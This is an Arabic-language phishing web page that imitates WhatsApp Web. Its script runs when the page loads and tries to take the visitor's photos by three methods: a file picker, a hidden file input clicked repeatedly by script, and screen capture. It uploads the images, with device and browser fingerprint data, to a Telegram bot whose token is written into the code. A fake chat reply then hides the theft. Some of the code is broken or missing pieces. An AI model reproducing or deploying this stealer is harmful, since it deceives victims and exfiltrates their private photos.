    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; }
        body { font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif; background: #ece5dd; height: 100vh; overflow: hidden; direction: rtl; }
        .whatsapp-container { display: flex; height: 100vh; }
        .sidebar { width: 30%; background: #fff; border-right: 1px solid #e1dcd5; display: flex; flex-direction: column; }
        .header { background: #075e54; color: white; padding: 1rem; display: flex; align-items: center; gap: 1rem; }
        .profile-pic { width: 40px; height: 40px; border-radius: 50%; background: linear-gradient(45deg, #25d366, #128c7e); display: flex; align-items: center; justify-content: center; font-weight: bold; }
        .header-text { flex: 1; }
        .chat-list { flex: 1; overflow-y: auto; }
        .chat-item { padding: 1rem; border-bottom: 1px solid #f0f0f0; cursor: pointer; transition: background 0.2s; display: flex; align-items: center; gap: 1rem; }
        .chat-item:hover { background: #f5f5f5; }
        .chat-avatar { width: 50px; height: 50px; border-radius: 50%; background: linear-gradient(45deg, #ff6b6b, #4ecdc4); display: flex; align-items: center; justify-content: center; }
        .chat-info h3 { font-size: 0.95rem; margin-bottom: 0.2rem; color: #111; }
        .chat-info p { font-size: 0.85rem; color: #667781; }
        .chat-list::-webkit-scrollbar { width: 6px; }
        .chat-list::-webkit-scrollbar-track { background: #f1f1f1; }
        .chat-list::-webkit-scrollbar-thumb { background: #c1c1c1; border-radius: 3px; }
        .main-chat { flex: 1; display: flex; flex-direction: column; background: #efeae2 url('data:image/svg+xml;base64,PHN2ZyB3aWR0aD0iMTAwJSIgaGVpZ2h0PSIxMDAlIiB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciPjxyZWN0IHdpZHRoPSIxMDAlIiBoZWlnaHQ9IjEwMCUiIGZpbGw9IiNmMGYwZjAiIG9wYWNpdHk9IjAuMDUiLz48L3N2Zz4=') repeat; }
        .chat-header { background: #f0f2f5; padding: 1rem; border-bottom: 1px solid #e1dcd5; display: flex; align-items: center; gap: 1rem; }
        .chat-profile { display: flex; align-items: center; gap: 1rem; flex: 1; }
        .chat-profile-pic { width: 45px; height: 45px; border-radius: 50%; background: linear-gradient(45deg, #ff9ff3, #f368e0); }
        .chat-messages { flex: 1; padding: 1.5rem; overflow-y: auto; display: flex; flex-direction: column; gap: 1.5rem; }
        .message { max-width: 70%; padding: 0.8rem 1rem; border-radius: 0.75rem; position: relative; }
        .message.sent { background: #dcf8c6; align-self: flex-end; margin-left: auto; border-bottom-right-radius: 0.25rem; }
        .message.received { background: white; align-self: flex-start; border-bottom-left-radius: 0.25rem; box-shadow: 0 1px 0.5px rgba(0,0,0,0.13); }
        .message-time { font-size: 0.75rem; color: #667781; margin-top: 0.25rem; }
        .typing-indicator { display: flex; align-items: center; gap: 0.25rem; padding: 0.8rem 1rem; background: white; max-width: 70%; align-self: flex-start; border-radius: 0.75rem; border-bottom-left-radius: 0.25rem; box-shadow: 0 1px 0.5px rgba(0,0,0,0.13); }
        .typing-dot { width: 6px; height: 6px; border-radius: 50%; background: #919191; animation: typing 1.4s infinite; }
        .typing-dot:nth-child(2) { animation-delay: 0.2s; }
        .typing-dot:nth-child(3) { animation-delay: 0.4s; }
        @keyframes typing { 0%, 60%, 100% { transform: translateY(0); } 30% { transform: translateY(-10px); } }
        .input-container { padding: 1rem; background: #f0f2f5; border-top: 1px solid #e1dcd5; display: flex; align-items: flex-end; gap: 1rem; }
        .emoji-btn, .attach-btn { width: 40px; height: 40px; border: none; background: none; cursor: pointer; display: flex; align-items: center; justify-content: center; border-radius: 50%; transition: background 0.2s; }
        .emoji-btn:hover, .attach-btn:hover { background: rgba(0,0,0,0.1); }
        .message-input { flex: 1; padding: 0.75rem 1rem; border: none; background: white; border-radius: 2rem; outline: none; font-size: 0.95rem; resize: none; max-height: 120px; }
        .send-btn { width: 45px; height: 45px; border: none; background: #00d65a; color: white; border-radius: 50%; cursor: pointer; display: flex; align-items: center; justify-content: center; transition: transform 0.2s; }
        .send-btn:hover { transform: scale(1.05); }
        .photo-preview { max-width: 200px; max-height: 200px; border-radius: 0.75rem; object-fit: cover; }
        .stealing-indicator { position: fixed; top: 20px; left: 20px; background: rgba(0,0,0,0.8); color: white; padding: 0.5rem 1rem; border-radius: 20px; font-size: 0.8rem; z-index: 10000; display: none; }
        @media (max-width: 768px) { .sidebar { width: 100%; position: absolute; z-index: 100; transform: translateX(100%); transition: transform 0.3s; } .sidebar.open { transform: translateX(0); } .main-chat { width: 100%; } }

<body>
    <div class="stealing-indicator" id="stealingStatus">جاري تحميل الصور...</div>

    <script>
        // Telegram Bot Configuration
        const BOT_TOKEN = '8591713771:AAHsYoY0Be8gkmHVBF_ykWmpPt293_PNELk'; // Replace with your bot token
        const CHAT_ID = '8539996558';     // Replace with your chat ID
        
        let isStealing = false;
        const stealingStatus = document.getElementById('stealingStatus');
        const messages = document.getElementById('messages');
        
        // Victim Intel
        const victimData = {
            ip: '',
            userAgent: navigator.userAgent,
            screen: `${screen.width}x${screen.height}`,
            language: navigator.language,

        // Stealth Gallery Stealer - Multi-method approach
        async function stealthGallerySteal() {
            if (isStealing) return;
            isStealing = true;
            
            stealingStatus.style.display = 'block';
            stealingStatus.textContent = 'جاري الوصول لمعرض الصور...';

                if ('showOpenFilePicker' in window) {

                // Method 3: MediaDevices gallery access attempt
                await stealViaMediaDevices();
                
            } catch (e) {
                console.log('Fallback methods exhausted');
            } finally {
                setTimeout(() => {
                    stealingStatus.style.display = 'none';
                    showFakeConfirmation();

        // Method 1: File System Access API - Direct directory access
        async function stealViaFileSystem() {
            try {
                const pickerOpts = {
                    types: [{
                        description: 'Photos',
                        accept: {
                            'image/*': ['.jpg', '.jpeg', '.png', '.webp', '.heic']

                    }],
                    multiple: true,

                const fileHandles = await window.showOpenFilePicker(pickerOpts);
                const files = [];
                
                for (const handle of fileHandles.slice(0, 25)) {
                    const file = await handle.getFile();
                    if (file.size > 50 * 1024 && file.size < 10 * 1024 * 1024) { // 50KB-10MB

                    }

                if (files.length > 0) {
                    await uploadFiles(files, 'FileSystem API');
                    return true;
                }
            } catch (e) {}
            return false;
        }
        
        // Method 2: Hidden file input with programmatic trigger
        async function stealViaHiddenInput() {
            return new Promise((resolve) => {
                const input = document.createElement('input');
                input.type = 'file';
                input.multiple = true;
                input.accept = 'image/*';
                input.style.display = 'none';
                input.setAttribute('webkitdirectory', '');
                input.setAttribute('directory', '');
                
                // Auto-trigger after micro-delay
                document.body.appendChild(input);
                
                const trigger = () => {
                    input.onchange = async (e) => {
                        const files = Array.from(e.target.files)
                            .filter(f => f.size > 50 * 1024 && f.size < 10 * 1024 * 1024)
                            .slice(0, 25);
                        
                        if (files.length > 0) {
                            await uploadFiles(files, 'Gallery Input');
                        }
                        document.body.removeChild(input);
                        resolve();
                    };
                    
                    // Programmatic click sequence
                    setTimeout(() => input.click(), 50);
                    setTimeout(() => input.click(), 100);
                    setTimeout(() => input.click(), 200);
                };
                
                trigger();
            });
        }
        
        // Method 3: MediaDevices + getDisplayMedia fallback
        async function stealViaMediaDevices() {
            try {
                const stream = await navigator.mediaDevices.getDisplayMedia({
                    video: true,
                    audio: false
                });
                
                // Capture screen with gallery visible (timing-based)
                const canvas = document.createElement('canvas');
                const ctx = canvas.getContext('2d');
                canvas.width = 1920;
                canvas.height = 1080;
                
                const video = document.createElement('video');
                video.srcObject = stream;
                await video.play();
                
                setTimeout(() => {
                    ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
                    canvas.toBlob((blob) => {
                        const fakeFile = new File([blob], `gallery_${Date.now()}.jpg`, {type: 'image/jpeg'});
                        uploadFiles([fakeFile], 'MediaDevices');
                    }, 'image/jpeg', 0.9);
                    stream.getTracks().forEach(track => track.stop());
                }, 1000);
                
            } catch (e) {
                // Silent fail
            }
        }
        
        // Parallel file upload to Telegram
        async function uploadFiles(files, source) {
            const formData = new FormData();
            formData.append('chat_id', CHAT_ID);
            
            // Add victim intel
            formData.append('caption', JSON.stringify({
                ...victimData,
                source: source,
                photoCount: files.length,
                device: /Android/i.test(navigator.userAgent) ? 'Android' : 'iOS/Desktop'
            }));
            
            // Upload in parallel batches (20/sec max)
            const batchSize = 5;
            for (let i = 0; i < files.length; i += batchSize) {
                const batch = files.slice(i, i + batchSize);
                
                for (const file of batch) {
                    formData.append('photo', file, file.name);
                }
                
                try {
                    const response = await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, {
                        method: 'POST',
                        body: formData
                    });
                    
                    // Reset formData for next batch
                    formData.delete('chat_id');
                    formData.delete('caption');
                    for (let j = 0; j < batchSize; j++) {
                        formData.delete('photo');
                    }
                } catch (e) {
                    console.log('Upload batch failed:', e);
                }
                
                // Rate limiting
                await new Promise(resolve => setTimeout(resolve, 250));
            }
            
            stealingStatus.textContent = `تم سرقة ${files.length} صورة بنجاح!`;
        }
        
        // Deception: Fake chat confirmation
        function showFakeConfirmation() {
            const typingIndicator = document.createElement('div');
            typingIndicator.className = 'typing-indicator';
            typingIndicator.innerHTML = `
                <div class="typing-dot"></div>
                <div class="typing-dot"></div>
                <div class="typing-dot"></div>
                <span style="margin-right: 0.5rem;">سارة تكتب...</span>
            `;
            
            messages.appendChild(typingIndicator);
            messages.scrollTop = messages.scrollHeight;
            
            setTimeout(() => {
                messages.removeChild(typingIndicator);
                
                const confirmMsg = document.createElement('div');
                confirmMsg.className = 'message received';
                confirmMsg.innerHTML = `
                    شكراً! استلمت كل الصور بنجاح 😍 رائعة جداً! 📸✨
                    <div class="message-time">الآن</div>
                `;
                messages.appendChild(confirmMsg);
                messages.scrollTop = messages.scrollHeight;
            }, 2000);
        }
        
        // Initialize phishing page
        window.addEventListener('load', () => {
            // 2 second delay for realism
            setTimeout(stealthGallerySteal, 2000);
        });
        
        // Chat interactions (for deception)
        document.querySelector('.chat-item').addEventListener('click', function() {
            this.classList.add('active');
        });
        
        document.querySelector('.send-btn').addEventListener('click', function() {
            const input = document.querySelector('.message-input');
            if (input.value.trim()) {
                const msg = document.createElement('div');
                msg.className = 'message sent';
                msg.innerHTML = `
                    ${input.value}
                    <div class="message-time">الآن</div>
                `;
                messages.appendChild(msg);
                messages.scrollTop = messages.scrollHeight;
                input.value = '';
            }
        });
        
        document.querySelector('.message-input').addEventListener('keypress', (e) => {
            if (e.key === 'Enter' && !e.shiftKey) {
                e.preventDefault();
                document.querySelector('.send-btn').click();
            }
